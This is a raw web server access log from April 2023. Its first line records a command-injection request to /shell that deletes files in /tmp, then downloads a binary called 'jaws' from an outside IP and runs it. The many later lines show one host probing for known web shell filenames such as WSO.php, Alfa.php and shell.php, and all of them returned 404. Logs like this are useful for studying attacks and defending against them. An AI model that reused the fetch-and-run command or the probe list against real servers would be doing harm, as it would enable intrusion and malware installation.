::ffff:201.150.126.209 - - [03/Apr/2023:00:00:19 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+161.35.208.230/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:36 +0000] "GET /k.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:37 +0000] "GET /wikindex.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:38 +0000] "GET /y.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:39 +0000] "GET /alf.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:40 +0000] "GET /WSO.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:40 +0000] "GET /10.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:42 +0000] "GET /2index.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:43 +0000] "GET /mari.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:44 +0000] "GET /1.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:45 +0000] "GET /100.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:46 +0000] "GET /wp-admin.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:47 +0000] "GET /shx.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:48 +0000] "GET /xx.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:49 +0000] "GET /shell.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:50 +0000] "GET /wso1.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:51 +0000] "GET /doc.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:52 +0000] "GET /wso2.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:53 +0000] "GET /wp-content/wp.php HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:54 +0000] "GET /uploads/up.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:55 +0000] "GET /old-index.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:56 +0000] "GET /9.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:57 +0000] "GET /date.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:42:59 +0000] "GET /n.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:00 +0000] "GET /p.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:01 +0000] "GET /mar.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:01 +0000] "GET /01.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:02 +0000] "GET /0.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:03 +0000] "GET /wp-admin/fw.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:04 +0000] "GET /about.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:05 +0000] "GET /xmlrpc.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:06 +0000] "GET /ups.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:07 +0000] "GET /wp-content/x.php HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:08 +0000] "GET /root.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:09 +0000] "GET /wp-content/fw.php HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:10 +0000] "GET /wp-includes/about.php HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:11 +0000] "GET /q.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:12 +0000] "GET /xxx.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:13 +0000] "GET /h.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:14 +0000] "GET /a.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:15 +0000] "GET /fox.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:16 +0000] "GET /wp-includes/991176.php HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:18 +0000] "GET /wp-admin/radio.php HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:18 +0000] "GET /wp.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:19 +0000] "GET /wp-file.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:20 +0000] "GET /jindex.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:21 +0000] "GET /Alfa.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:22 +0000] "GET /403.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:23 +0000] "GET /0byte.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:24 +0000] "GET /s.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:25 +0000] "GET /haxor.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:26 +0000] "GET /xl.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:27 +0000] "GET /r.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:27 +0000] "GET /hello.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:29 +0000] "GET /4.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:30 +0000] "GET /g.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:31 +0000] "GET /priv8.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:32 +0000] "GET /wp-class.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:33 +0000] "GET /wp-admin/css/fw.php HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:33 +0000] "GET /uploader.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:34 +0000] "GET /e.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:35 +0000] "GET /2.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:36 +0000] "GET /wp_wrong_datlib.php HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:37 +0000] "GET /f.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:38 +0000] "GET /5.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:39 +0000] "GET /v.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
::ffff:104.129.128.103 - - [03/Apr/2023:00:43:40 +0000] "GET /w3llstore.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
